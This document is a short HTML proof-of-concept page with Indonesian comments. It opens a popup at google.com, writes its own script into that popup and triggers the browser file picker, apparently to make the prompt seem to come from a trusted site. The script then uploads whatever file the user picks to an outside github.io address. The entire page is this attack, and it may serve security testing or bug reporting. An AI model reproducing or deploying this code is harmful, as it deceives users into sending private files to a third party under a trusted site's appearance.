<!doctype html>
<html>
<head><meta charset="utf-8"><title>Host</title></head>
<body>
  <button id="go">Click to open popup and trigger picker</button>
  <pre id="log"></pre>
<script>
const log = t => { document.getElementById('log').textContent += t + '\n'; console.log(t); };

document.getElementById('go').addEventListener('click', () => {
  // Buka popup kosong yang bisa kita tulis — harus synchronous dari klik
  const w = window.open('https://www.google.com', '_blank', 'width=600,height=400');

  const html = `
    <!doctype html>
    <html>
    <body>
      <p>Popup: will call showOpenFilePicker()</p>
      <pre id="p"></pre>
      <script>
        const p = s => { document.getElementById('p').textContent += s + '\\n'; console.log(s); };
        (async function(){
          try {
            p('Calling showOpenFilePicker() now...');
            const [fh] = await showOpenFilePicker({
              types: [{ description: 'Images', accept: {'image/*': ['.png','.jpg','.jpeg','.gif','.webp'] } }],
              multiple: false
            });
            const file = await fh.getFile();
            p('Got file: ' + file.name + ' size=' + file.size);

            // contoh upload (ganti URL dengan server testingmu yang CORS-enabled)
            const fd = new FormData();
            fd.append('file', file, file.name);
            const res = await fetch('https://nurhayatikania1.github.io/poc12.html', { method: 'POST', body: fd });
            p('Upload sent, status=' + res.status);
          } catch (e) {
            p('Error: ' + (e && e.name) + ' ' + (e && e.message));
          }
        })();
      <\/script>
    </body>
    </html>
  `;

  w.document.open();
  w.document.write(html);
  w.document.close();

  log('Popup opened and document written.');
});
</script>
</body>
</html>
